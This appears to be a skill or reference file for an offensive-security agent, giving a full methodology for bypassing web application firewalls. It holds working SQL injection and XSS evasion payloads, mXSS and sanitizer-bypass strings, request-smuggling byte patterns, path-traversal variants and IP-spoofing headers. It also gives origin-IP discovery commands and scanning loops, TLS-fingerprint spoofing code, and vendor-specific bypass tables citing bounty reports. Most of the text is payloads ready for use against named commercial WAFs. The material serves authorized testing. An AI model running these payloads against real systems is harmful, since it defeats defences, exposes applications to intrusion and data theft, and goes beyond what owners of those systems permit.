---
name: waf_bypass
description: WAF bypass via parser differentials, payload encoding, protocol-level evasion, and origin IP discovery
depends_on: []
---

# WAF Bypass

Web Application Firewalls inspect traffic at layers 3-7 and block requests matching known attack signatures. Bypasses exploit gaps between how the WAF parses requests and how the backend application processes them. Every parser differential is a potential bypass. The goal is not to "defeat" the WAF but to deliver the same payload in a form the WAF does not recognize.

## Attack Surface

**WAF Types**
- Cloud-based: Cloudflare, Akamai, AWS WAF, Azure Front Door, Imperva/Incapsula, Sucuri, Fastly
- Appliance/on-prem: F5 BIG-IP ASM, ModSecurity, Barracuda, FortiWeb
- CDN-integrated: Cloudflare Workers, AWS CloudFront + WAF, Vercel Edge
- Application-level: rate limiters, input validators, custom middleware

**Parser Differentials**
- WAF parses HTTP one way, backend parses differently
- URL normalization, encoding depth, content-type handling, header parsing all vary
- HTTP/2 and HTTP/3 introduce additional parsing inconsistencies

## WAF Fingerprinting

### Passive Detection

Identify WAF presence and vendor from response artifacts:

```
# Response headers to check
Server: cloudflare | AkamaiGHost | Sucuri/Cloudproxy | BigIP
X-Sucuri-ID: <id>
CF-RAY: <ray-id>
X-CDN: Incapsula
X-Iinfo: <incapsula-info>
X-Akamai-Transformed: <value>
X-Powered-By-Plesk: <value>
Set-Cookie: visid_incap_* | __cfduid | ak_bmsc | TS*
```

### Active Fingerprinting

```bash
# wafw00f - dedicated WAF detection
wafw00f https://target.com
wafw00f https://target.com -a  # test all WAFs, not just first match

# Manual probing - send obvious attack payloads and observe blocking behavior
curl -s -o /dev/null -w "%{http_code}" "https://target.com/?id=1' OR 1=1--"
curl -s -o /dev/null -w "%{http_code}" "https://target.com/?q=<script>alert(1)</script>"

# Compare block pages - different WAFs have distinct block responses
curl -v "https://target.com/?test=../../etc/passwd" 2>&1 | grep -i "block\|denied\|forbidden\|attention"
```

### Block Behavior Signatures

| WAF | Typical Block Status | Block Page Indicator |
|-----|---------------------|---------------------|
| Cloudflare | 403/1020 | "Attention Required", "cf-error" |
| Akamai | 403 | "Access Denied", reference ID |
| Imperva | 302/403 | "Incapsula incident ID" |
| AWS WAF | 403 | "Request blocked", generic 403 |
| ModSecurity | 403 | "ModSecurity", "Not Acceptable" |
| Sucuri | 403 | "Access Denied - Sucuri" |
| F5 BIG-IP | 403 | "The requested URL was rejected" |

## Payload Encoding Bypasses

### URL Encoding Layers

```
# Single URL encoding
' OR 1=1-- -> %27%20OR%201%3D1--

# Double URL encoding (WAF decodes once, app decodes again)
' OR 1=1-- -> %2527%2520OR%25201%253D1--

# Triple encoding (rare, some proxies add decode layers)
%27 -> %25%32%37
```

### Unicode and Alternate Encodings

```
# Unicode full-width characters
< -> %EF%BC%9C  (fullwidth less-than)
> -> %EF%BC%9E  (fullwidth greater-than)
' -> %EF%BC%87  (fullwidth apostrophe)

# UTF-8 overlong encoding (illegal but sometimes accepted)
/ -> %c0%af  (2-byte overlong)
/ -> %e0%80%af  (3-byte overlong)

# HTML entities (useful in reflected contexts)
<script> -> &lt;script&gt;  (WAF may check decoded, app renders)
' -> &#39; or &#x27;
" -> &#34; or &#x22;

# Hex encoding in SQL contexts
admin -> 0x61646d696e
```

### Null Byte Injection

```
# Null bytes can terminate WAF string matching while app continues parsing
payload%00.jpg
test%00<script>alert(1)</script>
file.php%00.jpg

# Between payload components
SEL%00ECT * FROM users
```

## HTTP Method and Header Manipulation

### Method Override

Some frameworks accept method override headers, but the WAF only inspects the declared method:

```
# Override headers - send POST body with GET-like method
X-HTTP-Method-Override: PUT
X-Method-Override: PATCH
X-HTTP-Method: DELETE
_method=PUT  (in POST body, Rails/Laravel convention)

# If WAF only inspects GET/POST, override to a method it ignores
POST /api/users HTTP/1.1
X-HTTP-Method-Override: DELETE
```

### IP Spoofing Headers

Bypass IP-based allow/blocklists when the WAF trusts upstream proxy headers:

```
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Custom-IP-Authorization: 127.0.0.1
X-Originating-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
Forwarded: for=127.0.0.1
```

Test each header individually and in combination. Some WAFs trust the last value, others trust the first.

## Path and URL Manipulation

### Path Normalization Differentials

WAFs and backends normalize paths differently. Exploit the gap:

```
# Double slashes
/admin -> //admin
/api/users -> /api//users

# Dot segments
/admin -> /./admin
/admin -> /path/../admin

# URL-encoded path separators
/admin -> /%2fadmin
/admin -> /admin%2f

# Semicolon parameters (Tomcat, Java)
/admin -> /admin;jsessionid=x
/admin -> /admin;.css

# Backslash (IIS/Windows)
/admin -> /admin\
/admin -> \admin

# Mixed case paths (case-insensitive backends)
/Admin -> /ADMIN -> /aDmIn

# Trailing characters
/admin -> /admin.
/admin -> /admin..
/admin -> /admin%20
/admin -> /admin%09
```

## Content-Type Confusion

The WAF inspects the body according to the declared Content-Type, but the backend may parse differently:

```
# Normal request the WAF blocks
POST /api/login HTTP/1.1
Content-Type: application/json
{"user":"admin' OR 1=1--"}

# Bypass: send as form-encoded (WAF parses form, backend still accepts JSON)
POST /api/login HTTP/1.1
Content-Type: application/x-www-form-urlencoded
{"user":"admin' OR 1=1--"}

# Bypass: multipart form-data with embedded payload
POST /api/login HTTP/1.1
Content-Type: multipart/form-data; boundary=----xyz
------xyz
Content-Disposition: form-data; name="user"

admin' OR 1=1--
------xyz--

# Bypass: text/xml or text/plain
Content-Type: text/xml
Content-Type: text/plain
Content-Type: application/xml
```

## Chunked Transfer Encoding

Break payloads across HTTP chunks so the WAF cannot match the full signature:

```
POST /search HTTP/1.1
Transfer-Encoding: chunked

3
SEL
3
ECT
7
 * FRO
8
M users
0

```

Combine with Content-Length header for CL.TE or TE.CL request smuggling if the WAF and backend disagree on body boundaries.

## Case and Comment Injection

### SQL Keyword Evasion

```
# Case variation
SELECT -> SeLeCt -> sElEcT -> sELECt
UNION -> UnIoN -> uNiOn

# Comment insertion (MySQL)
SELECT -> S/**/ELECT -> SEL/**/ECT
UNION SELECT -> UN/**/ION/**/SE/**/LECT
UNION/**/SELECT/**/1,2,3

# MySQL version comments (execute on specific versions)
/*!50000SELECT*/ -> executes on MySQL >= 5.00.00
/*!UNION*/ SELECT

# Whitespace alternatives
SELECT\t*\tFROM -> tabs instead of spaces
SELECT%0a*%0aFROM -> newlines
SELECT%09*%09FROM -> horizontal tabs
SELECT%0b*%0bFROM -> vertical tabs
SELECT%0c*%0cFROM -> form feeds
```

### XSS Payload Evasion

```
# Case variation
<script> -> <ScRiPt> -> <sCrIpT>

# Event handlers without script tags
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onpageshow=alert(1)>
<details open ontoggle=alert(1)>

# JavaScript protocol
<a href="javascript:alert(1)">
<a href="&#106;avascript:alert(1)">
<a href="java%0ascript:alert(1)">

# Template literals
<img src=x onerror=alert`1`>
```

## HTTP/2 Specific Bypasses

HTTP/2 binary framing introduces WAF parsing challenges:

```
# CRLF injection in HTTP/2 pseudo-headers (some WAFs fail to validate)
:path: /api/search\r\nX-Injected: true

# Header name case (HTTP/2 requires lowercase, but some WAFs check case-insensitively)
# Inject via tools that allow raw HTTP/2 frame construction

# HTTP/2 continuation frames
# Split headers across CONTINUATION frames - WAF may only inspect the initial HEADERS frame

# Upgrade/downgrade
# Force HTTP/1.1 if WAF only has HTTP/2 rules, or vice versa
curl --http1.1 https://target.com/payload
```

## Origin IP Discovery

If the WAF is cloud-based (Cloudflare, Akamai), finding the origin server IP allows bypassing the WAF entirely by connecting directly.

### DNS History and Records

```bash
# SecurityTrails - historical DNS records
# Check A record history for pre-WAF IPs
curl -s "https://api.securitytrails.com/v1/history/target.com/dns/a" \
  -H "APIKEY: $ST_KEY" | jq '.records[].values[].ip'

# Certificate Transparency logs - find related subdomains that may expose origin
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u

# MX records - mail servers often share infrastructure with web servers
dig MX target.com +short

# SPF records - may list origin IP ranges
dig TXT target.com +short | grep spf

# Check if subdomains resolve to origin (not all go through WAF)
for sub in mail ftp cpanel direct staging dev; do
  echo "$sub.target.com: $(dig +short $sub.target.com)"
done
```

### Scanning and Shodan

```bash
# Shodan - search for server responding with same TLS cert or page content
shodan search "ssl.cert.subject.cn:target.com" --fields ip_str,port
shodan search "http.title:'Target Site Title'" --fields ip_str,port

# Censys - certificate-based origin discovery
# Search certificates issued to target.com, check associated IPs

# Direct IP scanning - if you know the hosting provider IP range
masscan -p80,443 <provider-range> --rate 1000 | \
  while read ip; do curl -sk -H "Host: target.com" "https://$ip/" | grep -l "expected-content"; done
```

### Verification

```bash
# Once candidate origin IP is found, verify it serves the same content
curl -sk -H "Host: target.com" "https://<origin-ip>/" | head -50

# Check if origin accepts connections without WAF headers
curl -sk "https://<origin-ip>/" -H "Host: target.com" -o /dev/null -w "%{http_code}"
```

## Rate Limit Bypass

```
# Rotate IP via headers (if backend trusts them)
X-Forwarded-For: <random-ip>

# Vary request shape to avoid signature matching
# Alternate parameter order, add junk params, change casing
/api/login?user=admin&pass=test
/api/login?pass=test&user=admin&_=<random>

# Throttle requests below detection threshold
# Most WAFs use sliding windows of 10-60 seconds

# HTTP/2 multiplexing - send many requests over single connection
# Some WAFs count connections, not requests
```

## TLS Fingerprint Evasion

WAFs like Cloudflare fingerprint TLS ClientHello (JA3/JA4) to detect automated tools:

```python
# curl_cffi - mimics real browser TLS fingerprints
import curl_cffi.requests as requests

# Impersonate Chrome
resp = requests.get("https://target.com/?id=1' OR 1=1--",
                    impersonate="chrome")

# Impersonate Firefox
resp = requests.get("https://target.com/",
                    impersonate="ff")
```

```bash
# FlareSolverr - headless browser proxy that solves Cloudflare challenges
# Run as Docker container, send requests through it
docker run -p 8191:8191 ghcr.io/flaresolverr/flaresolverr
curl -X POST http://localhost:8191/v1 \
  -H "Content-Type: application/json" \
  -d '{"cmd":"request.get","url":"https://target.com/","maxTimeout":60000}'
```

## Testing Methodology

1. **Fingerprint the WAF** - passive header analysis, then active probing with wafw00f and manual payloads
2. **Map blocking rules** - send known bad inputs (SQLi, XSS, path traversal) and record which get blocked vs allowed
3. **Find encoding gaps** - test single, double, and unicode encoding of blocked payloads
4. **Test parser differentials** - try content-type switching, chunked encoding, path normalization variants
5. **Probe header trust** - test IP override headers for whitelist bypass
6. **Attempt origin discovery** - DNS history, CT logs, Shodan/Censys for direct origin access
7. **Combine techniques** - layer encoding + case variation + comment insertion for compound bypasses
8. **Verify through WAF** - confirm the bypass delivers the payload to the application and it processes correctly

## Validation

1. Demonstrate a payload blocked by the WAF through normal delivery
2. Show the same payload (or equivalent) reaching the backend via the bypass technique
3. Confirm the backend processes the bypassed payload as intended (SQLi executes, XSS fires, etc.)
4. Provide both the blocked and bypassed request/response pairs for comparison
5. If origin IP discovered: show the WAF-protected request being blocked, then the direct-to-origin request succeeding

## False Positives

- WAF blocking a payload does not confirm the underlying vulnerability exists in the app
- Custom error pages that look like WAF blocks but are application-level validation
- CDN caching returning stale responses that appear to bypass the WAF
- IP headers being logged but not actually trusted for access decisions

## Impact

- WAF bypass exposes the underlying application to direct exploitation of any vulnerability the WAF was masking
- Origin IP discovery removes all WAF protections, not just for the tested payload class
- Rate limit bypass enables brute force, credential stuffing, and enumeration at scale
- Combining WAF bypass with another vulnerability (SQLi, RCE) escalates impact significantly

## Pro Tips

1. Always test the underlying vulnerability first without WAF bypass - confirm it exists before investing in evasion
2. Different WAF rules apply to different parameters - a bypass that works in query strings may not work in POST bodies
3. Double encoding is the highest-success-rate technique across most cloud WAFs
4. Path normalization bypasses are especially effective against URL-based WAF rules
5. Origin IP discovery is the highest-value finding - it bypasses ALL rules, not just one
6. Test in order of least noise: encoding -> headers -> path manipulation -> chunked -> origin discovery
7. Cloudflare Bot Management and Akamai Bot Manager require TLS fingerprint spoofing, not just header changes
8. Keep a library of confirmed bypasses per WAF vendor - they patch, but slowly
9. WAF bypass alone is typically Low severity; combine with the exploitable vulnerability for real impact
10. When reporting, show the full chain: WAF block -> bypass -> exploitation of underlying vuln

## Parser-Differential Method (Mechanism Families)

The bypass is always: **make the WAF and the backend disagree about what the
request body or URL means.** Six mechanism families to enumerate when a
specific payload keeps getting blocked despite the encoding/header tricks
above:

1. **Encoding differential** — WAF decodes one encoding, backend decodes
   another (or both, in different orders). Already covered by URL Encoding
   Layers, Unicode, and Null Byte sections above
2. **Structural differential** — multipart, JSON, XML, URL-form: parsers
   disagree about boundaries, key duplication, or nesting. JSON duplicate
   keys (`{"id":"harmless","id":"<payload>"}`) and multipart filename
   continuation (`filename*=UTF-8''payload`, RFC 2231) are perpetual
   bypasses across every WAF generation
3. **HTTP-layer differential** — chunked transfer, content-length, header
   case, header folding, request smuggling. Covered by the Chunked Transfer
   Encoding section above; extend to TE.CL / CL.TE desync when both layers
   accept the request
4. **Charset / Unicode differential** — UTF-8 normalisation, overlong
   encodings (`%c0%ae` → `.`), full-width Latin (`UNION` → `ＵＮＩＯＮ`),
   combining characters, RTL marks (`U+202E`)
5. **Rule-evasion differential** — when the WAF rule is open-source
   (ModSecurity, Coraza) or leaked, the literal regex tells you exactly
   what shape to avoid. Whitespace insertion (`UNION/**/SELECT`), comment
   splitting, function aliases (`SUBSTR` vs `MID` vs `SUBSTRING`), hex
   literals (`0x61646d696e` instead of `'admin'`), string concatenation
   at the language level (`'a'+'d'+'min'` in JS, `chr(97)||chr(100)` in
   PG)
6. **Rate-limit / IP rotation** — covered by Rate Limit Bypass and TLS
   Fingerprint Evasion sections; the WAF isn't blocking the payload, it's
   blocking *you*

Test mechanism families in cost order: encoding (cheapest) → structural →
HTTP-layer → rule-evasion → charset → rate-limit / origin discovery
(highest-impact). Within each family, **change one variable at a time** —
if you change five things and it works, you don't know which one mattered.

## Confirm-Outside-The-WAF Baseline

Before investing in evasion, confirm the underlying vulnerability is real:

1. **Find a path that doesn't go through the WAF** — local copy, staging
   environment, subdomain without WAF coverage, direct-to-origin if you've
   already done origin IP discovery
2. **Verify the canonical payload triggers the bug there** — actual SQLi
   execution, actual XSS in DOM, actual RCE output
3. *Then* return to the WAF-protected target with the bypass effort

If the payload doesn't work without the WAF either, you have a different
problem and WAF evasion is wasted budget. This baseline step also gives you
a tight feedback loop: the diff between "works on staging, blocked in prod"
is the bypass surface.

## Bypass-as-Leverage Framing

A WAF bypass is leverage on the *real* vulnerability behind it. Severity
inherits from that vulnerability, not from the bypass itself:

- WAF bypass on SQLi origin → RCE / data exfiltration severity of the SQLi
- WAF bypass on XSS origin → ATO severity of the XSS chain
- WAF bypass on prototype pollution / deserialisation origin → RCE
- WAF bypass alone (no underlying bug) → informational at best

Report the full chain: blocked baseline → bypass variant → exploitation of
the underlying vulnerability → impact. A bypass without an underlying
vulnerability is a curiosity — the report needs the impact, not just "I
made the WAF return 200".

## Reference Lab

A useful self-contained bypass lab: a Coraza WAF (Go) in front of a Next.js
backend (Node.js, busboy multipart parser), exploiting prototype-pollution
RCE in Next.js server actions (`__proto__`, `:constructor`). The WAF rules
block the literal substrings; the methodology above works there because
Coraza's Go multipart parser and busboy's Node parser disagree on
multipart-header continuation, JSON duplicate keys, and Unicode escapes
inside JSON string values.

If the lab is set up locally (`localhost:9091` for the WAF, `localhost:8009`
for an executor that returns WAF logs alongside the response), it's a
useful sanity check. The technique is identical against any WAF — only the
parser pair changes.

## Discovery Signals

Indicators that a WAF bypass is worth pursuing on a target:

| # | Signal | What to Do |
|---|--------|------------|
| 1 | Response headers contain WAF vendor signature (`CF-RAY`, `X-Sucuri-ID`, `AkamaiGHost`, `X-CDN: Incapsula`, `TS*` cookies) | Fingerprint exact product; load vendor-specific bypass matrix below |
| 2 | 403/block page with reference ID when sending `' OR 1=1--` but 200 on benign request | WAF has SQLi rules active; test encoding layers and comment injection |
| 3 | Different HTTP status for same payload via HTTP/1.1 vs HTTP/2 | Protocol-version parser differential; test H2-specific bypasses |
| 4 | Backend error leaks through WAF on malformed Content-Type (`application/x-www-form-urlencoded; charset=ibm037`) | WAF doesn't normalize charset; charset-switch bypass likely works |
| 5 | Path `/admin` blocked but `/admin;x=1` or `/admin%2f` returns different status | Path-normalization differential present; enumerate all path tricks |
| 6 | Block page differs between query-string payload and POST-body payload | WAF inspects parameters asymmetrically; body may have weaker rules |
| 7 | Request with `Transfer-Encoding: chunked` gets different treatment than `Content-Length` | TE/CL handling mismatch; test smuggling primitives |
| 8 | WAF blocks `<script>` but allows `<svg onload>` or `<details ontoggle>` | Tag-level blocklist (not full HTML parse); event-handler tags bypass |
| 9 | Adding `%00` (null byte) between keywords changes block/allow behavior | Null-byte-aware string matching; WAF uses C-string functions internally |
| 10 | Response varies with `X-Forwarded-For: 127.0.0.1` vs without | WAF trusts proxy headers for allowlisting; IP spoof bypass works |
| 11 | Multipart form-data uploads bypass rules that apply to URL-encoded bodies | WAF parser doesn't cover all Content-Types; structural differential |
| 12 | JSON duplicate keys (`{"id":"safe","id":"<payload>"}`) pass through | WAF takes first key, backend takes last (or vice versa); key-duplication bypass |

## WAF Product Bypass Matrix

Vendor-specific techniques sourced from disclosed bounty reports ($50K-$600K payouts):

| WAF | Bypass Technique | Payload Pattern | Why It Works | Report/Source |
|-----|-----------------|-----------------|-------------|---------------|
| Google Cloud Armor + GCLB | Chunk-ext `\r` in BWS | `2\r\r;a\r\n` inside chunked body smuggles second request | LB forwards bare `\r` in chunk-ext; Node.js interprets `\r\r` as `\r\n` — parser differential | H1 #453112832 ($600K) |
| Google Cloud Armor + GCLB | Non-ASCII header-name byte | `Transfer-Encoding\xa0: chunked` | LB accepts obs-text (0x80+) in header names; Gunicorn `str.strip()` strips `\xa0` as Unicode whitespace, sees valid TE header | H1 #207025664 ($500K) |
| Google Cloud CDN | Bare CR after HTTP method | `GET\r /index.html HTTP/1.1` | LB forwards bare CR; backend treats `GET\r` as unknown method (501); negative caching poisons URL for all users | H1 #167211008 ($500K) |
| Cloudflare | TLS fingerprint (JA3/JA4) | Use `curl_cffi` with `impersonate="chrome"` | Bot Management blocks non-browser TLS; spoofing ClientHello passes | Documented bypass |
| Cloudflare | Chunked + double encoding | `%2527` in chunked body fragments | WAF decodes one layer; backend decodes both | Common pattern |
| AWS WAF | Unicode full-width chars | `ＵＮＩＯＮ ＳＥＬＥＣＴ` (U+FF35...) | Regex rules match ASCII only; backend normalizes full-width to ASCII | Community research |
| AWS WAF | JSON body with `Content-Type: text/plain` | SQL payload in JSON body declared as text/plain | WAF skips body parsing for text/plain; backend still parses JSON | Structural differential |
| ModSecurity/Coraza | Open-source regex evasion | Read CRS rules, craft input shape the regex misses | Rules are public; regex anchoring and alternation gaps are visible | Rule-evasion family |
| ModSecurity CRS | MySQL version comments | `/*!50000UNION*/SELECT` | CRS regex doesn't match inside MySQL conditional comments | CRS-specific |
| Akamai | HTTP/2 CONTINUATION frames | Split headers across CONTINUATION frames | WAF only inspects initial HEADERS frame; smuggled headers in continuations | H2 research |
| Imperva/Incapsula | Cookie-based session allowlisting | Complete JS challenge first, then replay cookie with attack payload | WAF trusts validated sessions; post-challenge requests have weaker inspection | Common pattern |
| F5 BIG-IP ASM | Parameter pollution (`id=safe&id=payload`) | Backend takes last value; WAF checks first | HPP (HTTP Parameter Pollution) across WAF/app | HPP research |
| Sucuri | Path-based rule bypass via `//` or `/./ ` | `//.//admin` or `/./admin` | Sucuri normalizes paths differently than Apache/Nginx | Path differential |

## Encoding Bypass Chain

Ordered by success rate. Test from top to bottom, one layer at a time:

| # | Encoding Layer | Technique | Example | Where It Works |
|---|---------------|-----------|---------|---------------|
| 1 | Double URL encoding | Encode `%` itself | `' OR 1=1` -> `%2527%2520OR%25201%253D1` | Any WAF that decodes once; backend decodes twice (Apache `AllowEncodedSlashes`, PHP, Java) |
| 2 | Unicode full-width | Replace ASCII with U+FFxx equivalents | `<` -> `%EF%BC%9C`, `UNION` -> `%EF%BC%B5%EF%BC%AE...` | WAFs with ASCII-only regex; backends that normalize Unicode (Python, .NET) |
| 3 | UTF-8 overlong | Illegal multi-byte sequences | `/` -> `%c0%af` (2-byte), `%e0%80%af` (3-byte) | IIS, older Java, PHP with specific mbstring settings |
| 4 | CSS numeric escapes | `\NNNNNN` inside style contexts | `\00003c` -> `<` inside `<style>url(cid://\00003c...)` | HTML sanitizers that treat `<style>` body as opaque; browser decodes CSS escapes | H1 #982291 ($5K) |
| 5 | HTML entity encoding | Named/numeric entities in reflected contexts | `&#x3c;script&#x3e;` or `&lt;script&gt;` | WAFs checking decoded form miss double-entity-encoded input |
| 6 | Hex SQL literals | Replace strings with hex | `admin` -> `0x61646d696e` | SQL WAF rules matching string literals; hex is syntactically valid SQL |
| 7 | SQL string concatenation | Language-specific concat | `'a'+'d'+'min'` (MSSQL), `chr(97)\|\|chr(100)` (PG), `CHAR(97,100)` (MySQL) | WAF keyword matching; backend reassembles at execution |
| 8 | Null byte injection | `%00` between keywords or before extension | `SEL%00ECT`, `file.php%00.jpg` | C-string-based WAF matching terminates at null; backend language ignores it |
| 9 | Charset switching | `Content-Type: ...; charset=ibm037` | EBCDIC-encoded payload body | WAF assumes UTF-8; backend respects declared charset (rare but devastating) |
| 10 | Base64 in data URIs | `data:text/html;base64,PHNjcmlwdD4=` | Payload inside base64 blob in `src`/`href` attributes | WAFs that don't decode base64; browser renders data URI |
| 11 | JSON Unicode escapes | `<` for `<` inside JSON strings | `{"name":"<script>alert(1)</script>"}` | WAF inspects raw JSON bytes; backend JSON parser decodes Unicode escapes |
| 12 | Python `str.strip()` Unicode whitespace | `\x85` (NEL) or `\xa0` (NBSP) appended to header names | `Transfer-Encoding\xa0: chunked` | Python-based backends strip Unicode whitespace but WAF treats as opaque header name | H1 #207025664 ($500K) |

## Context-Specific Bypass Payloads

Payloads organized by the underlying vulnerability being delivered through the WAF:

| Attack Type | WAF Rule Being Bypassed | Bypass Payload | Why It Works |
|-------------|------------------------|----------------|-------------|
| SQLi | `UNION SELECT` keyword detection | `UN/**/ION/**/SE/**/LECT` or `/*!50000UNION*/SELECT` | Comment insertion breaks keyword; MySQL version comments execute conditionally |
| SQLi | Quote/apostrophe blocking | `1 AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))` | No quotes needed; CONVERT triggers error-based extraction |
| SQLi | `OR 1=1` pattern detection | `OR 2>1` or `OR 'a'='a'` or `||1` | Semantic equivalents the regex doesn't cover |
| XSS | `<script>` tag blocking | `<svg/onload=alert(1)>` or `<details open ontoggle=alert(1)>` | Event handlers on non-script tags; WAF has tag blocklist not full HTML model |
| XSS | Event handler (`onerror`) blocking | `<img src=x onerror=alert`1`>` (template literal) or `<svg><animate onbegin=alert(1)>` | Backtick instead of parens; uncommon event handler names |
| XSS | `javascript:` scheme blocking | `<a href="&#106;avascript:alert(1)">` or `java\x0ascript:alert(1)` | HTML entity encoding or newline insertion inside scheme name |
| XSS (sanitizer) | Parse-and-allowlist sanitizer | `<!--!> <a href="javascript:alert(1)">` | HTML comment parser differential: Go `net/html` vs browser disagree on `<!--!>` | H1 #262114304 ($313K) |
| XSS (sanitizer) | Entity-inside-style-tag | `<svg><style>/* &lt;/style> &lt;img src=x onerror=alert(1)>` | Parser decodes `&lt;` to `<` inside `<style>`; sanitizer strips `<svg>` but keeps decoded text | H1 #366797312 ($750K) |
| XSS (mXSS) | DOMPurify namespace handling | `<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(1) src>">` | MathML/SVG namespace confusion causes re-parse mutation | H1 #1024734 |
| RCE | Path traversal filtering | `..;` (Tomcat), `/..%2f` (Nginx), `%c0%ae%c0%ae` (overlong) | Semicolon is path-parameter in Tomcat (stripped before routing); WAF sees non-traversal segment | H1 #1004007 |
| SSRF | Localhost/RFC1918 blocklist | 302 redirect from external host to `http://127.0.0.1` | Input validator checks submitted URL; HTTP client follows redirect without re-validating | H1 #369956352 ($50K) |
| Path traversal | `../` pattern blocking | `..%5c` (backslash), `..%252f` (double-encoded), `static../` (nginx alias) | Encoding variants of separator; alias misconfiguration bypasses prefix match | H1 #331988480 ($50K) |

## Defense-Bypass Pairs

Map each defensive layer to its known bypass primitive:

| # | Defense Layer | Bypass Primitive | Exploit Technique |
|---|-------------|-----------------|-------------------|
| 1 | Tag blocklist (`<script>` blocked) | Event handlers on allowed tags | `<img onerror>`, `<svg onload>`, `<details ontoggle>`, `<body onpageshow>` |
| 2 | Keyword regex (SQLi keywords) | Comment/whitespace injection | `S/**/ELECT`, `UNION%0aSELECT`, `SeLeCt` case variation |
| 3 | Input URL validation (SSRF) | Redirect following | Attacker-controlled 302 to internal target; DNS rebinding |
| 4 | Content-Type body parsing | Content-Type mismatch | Declare `text/plain`, send JSON body; declare `multipart`, embed payload |
| 5 | IP-based rate limiting | Header spoofing + rotation | `X-Forwarded-For: <random>` per request; H2 multiplexing for connection-counted limits |
| 6 | Client-side encoding/validation | Request interception (Burp/mitmproxy) | Replace pre-encoded `&lt;` with raw `<` in request body | H1 #881470464 ($10K) |
| 7 | CSP `script-src` nonce | `<base href>` tag injection | Redirect relative script paths to attacker domain; nonce preserved | H1 #1481207 ($14K) |
| 8 | CSP blocking inline handlers | Framework gadgets (Stimulus/jQuery-UJS) | `data-controller="beacon"` auto-submits forms; `data-remote=true` loads scripts | H1 #982291 ($5K), #836649 ($5K) |
| 9 | Shadow DOM / Web Component isolation | Closing-tag injection | `</template></message-content>` breaks out of shadow root | H1 #982291 ($5K) |
| 10 | HTML sanitizer tag stripping | Parser mutation (mXSS) | Namespace confusion (MathML/SVG) causes re-parse to expose hidden tags | H1 #1024734 |
| 11 | SVG allowlist filter | DOCTYPE entity declaration | `<!DOCTYPE svg [<!ENTITY e "">]>` flips parser mode; allowlist not applied | H1 #232174 ($5K) |
| 12 | Path-prefix ACL (reverse proxy) | Path-parameter semicolons | `/protected/..;/target` — proxy sees path under prefix; Tomcat resolves `..;` as `..` | H1 #1004007 |

## Chain Patterns

Multi-step bypass chains observed in high-value reports:

| # | Chain | Steps | Payout Range |
|---|-------|-------|-------------|
| 1 | Chunk-ext parser differential -> request smuggling -> WAF bypass | (a) Find byte WAF forwards but backend re-interprets (b) Smuggle second request past WAF inspection boundary (c) Smuggled request hits protected endpoint | $500K-$600K |
| 2 | HTML injection -> code-fence breakout -> UI spoofing/phishing | (a) Markdown sink accepts raw HTML (b) Premature code-fence close escapes sanitized context (c) Fullscreen `<div style="position:fixed">` overlays page | $1.3M (Google Gemini) |
| 3 | CSS numeric escape -> shadow DOM escape -> framework gadget CSRF | (a) `\00003c` inside `<style>url()` decodes to `<` in browser (b) Close `</template></message-content>` to escape shadow root (c) Inject `<form data-controller="beacon">` for auto-submit | $5K |
| 4 | SVG DOCTYPE entity -> parser mode flip -> sanitizer allowlist bypass -> XSS | (a) Upload SVG with `<!DOCTYPE svg [<!ENTITY e "">]>` (b) Entity declaration flips parser mode (c) Post-DTD content escapes allowlist -> `onload` fires | $5K |
| 5 | Nginx alias path traversal -> config/secret file read -> credential theft | (a) `location /static` (no trailing slash) + `alias .../static/` (b) Request `/static../settings.py` reads outside alias root | $50K |
| 6 | SSRF fix bypass -> redirect following -> internal port scan -> metadata exfil | (a) Input validator blocks `localhost` (b) External 302 redirects to `http://localhost:PORT` (c) Response body reflected -> non-blind SSRF | $50K |
| 7 | Inconsistent sanitization across code paths -> stored XSS | (a) `create` path sanitizes `javascript:` URLs (b) `edit-scheduled-post` path skips filter (c) Post publishes with live `javascript:` href | $5K |
| 8 | MathJax sub-language escape -> XSS + missing httpOnly -> ATO | (a) `\href{javascript:...}` in LaTeX context (b) MathJax emits real `<a>` tag sanitizer doesn't re-check (c) Session cookie lacks httpOnly -> exfiltrate via XSS | $10K |

## Pro Tips (Corpus-Derived)

Additional high-signal tips from $50K+ bounty reports:

8. **RFC grammar is the bypass map.** For every SHOULD/MAY in HTTP RFCs (9110, 9112, 9113), test whether each link in the proxy chain accepts, normalizes, or rejects. Where they disagree, smuggling lives. The $600K Google Cloud Armor bypass came from a single `\r` byte in chunk-ext BWS.
9. **Python `str.strip()` vs `bytes.strip()` is a recurring parser differential.** Unicode whitespace characters (`\x85` NEL, `\xa0` NBSP) are stripped by `str.strip()` but not `bytes.strip()`. Any Python backend (Gunicorn, uWSGI, Daphne) that decodes headers to `str` before stripping is vulnerable to header-name confusion.
10. **Post-sanitizer stages are bypass gold.** Any code that runs AFTER the HTML sanitizer and produces HTML output (reference redactors, link rewriters, mention renderers, image proxies) is a candidate for injection. The sanitizer already ran -- nobody re-sanitizes.
11. **Every parser mode is a bypass surface.** HTML parsers have modes (text, DTD, CDATA, foreign content). Sanitizers typically check one mode. Enter another mode (DOCTYPE entity declaration, SVG namespace, MathML integration point) and the allowlist may not apply.
12. **Negative caching amplifies cache poisoning.** Cloud CDN negative caching stores error responses (501, 404) against legitimate URLs. A parser differential that triggers a non-200 backend response can DoS any cached endpoint for the full TTL.
13. **E2EE shifts validation to the client.** In encrypted channels (Messenger, Signal desktop, WhatsApp), filename and MIME sanitization happens client-side. Server-side WAF/validation cannot inspect encrypted payloads. Client-side path traversal is the attack surface.
14. **Budget arithmetic matters for path traversal.** Windows MAX_PATH (256) minus the base path length equals your traversal budget. Count chars for `..\ ` sequences and calculate the reachable filesystem region before crafting payloads.
15. **Fix bypasses are a sustainable loop.** After a vendor patches a vulnerability, immediately retest: redirect following, encoding variants, alternate code paths (edit vs create), protocol version switching. Validators typically fix the exact reported vector and miss adjacent ones. The $50K AppSheet SSRF came from retesting after the original fix.

## Summary

WAF bypasses exploit parser differentials between the inspection layer and
the application layer. Effective testing combines fingerprinting, encoding
tricks, protocol-level manipulation, structural / HTTP-layer / rule-evasion
mechanism families, and origin discovery. The bypass itself is the means —
the underlying vulnerability is the finding.
